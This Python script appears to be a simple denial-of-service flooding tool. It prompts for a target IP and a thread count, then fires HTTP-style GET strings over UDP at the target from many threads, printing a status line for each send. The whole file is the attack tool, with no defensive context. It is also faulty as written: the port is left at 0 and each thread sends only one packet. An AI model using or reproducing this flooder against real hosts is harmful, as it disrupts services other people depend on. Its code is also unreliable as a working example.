import threading
import socket

ip = socket.gethostbyname(input("IP: "))
threads = int(input("Threads: "))

port = int()


s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


def udp():
    try:
        request = f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode()

        s.sendto(request, (ip, port))
        print("\033[32m[+]\033[0m UDP Packet sent ->", ip)

    except Exception as err:
        print("\033[31m[-]\033[0m", err)


for i in range(threads):
    t = threading.Thread(target=udp)
    t.start()

input("")
